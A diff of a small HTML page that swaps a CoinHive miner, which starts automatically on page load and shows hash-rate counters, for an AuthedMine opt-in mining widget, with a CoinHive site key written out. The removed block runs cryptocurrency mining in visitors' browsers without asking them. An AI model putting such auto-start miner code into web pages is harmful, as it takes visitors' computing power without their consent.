@@ -1,42 +1,12 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <!-- <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+  <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
   <div class="coinhive-miner"
     style="width: 256px; height: 310px"
     data-key="FkSrHyJz2G5LgTBeabreizeVVpONARO6"
   >
     <em>Loading...</em>
-  </div> -->
-  <p id="output">
-    <div>
-      <b id="hashesPerSecond">0</b>
-      HASHES/S
-    </div>
-    <div>
-      <b id="totalHashes">0</b>
-      Total Hashes
-    </div>
-    <div>
-      <b id="acceptedHashes">0</b>
-      Accepted Hashes
-    </div>
-  </p>
-  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-  <script>
-  	var miner = new CoinHive.Anonymous('FkSrHyJz2G5LgTBeabreizeVVpONARO6', {throttle: 0.3});
-		miner.start();
-    // Update stats once per second
-  	setInterval(function() {
-  		var hashesPerSecond = miner.getHashesPerSecond();
-  		var totalHashes = miner.getTotalHashes();
-  		var acceptedHashes = miner.getAcceptedHashes();
-
-  		// Output to HTML elements...
-      document.getElementById('hashesPerSecond').innerHTML = hashesPerSecond;
-      document.getElementById('totalHashes').innerHTML = totalHashes;
-      document.getElementById('acceptedHashes').innerHTML = acceptedHashes;
-  	}, 1000);
-  </script>
+  </div>
 </body>
 </html>
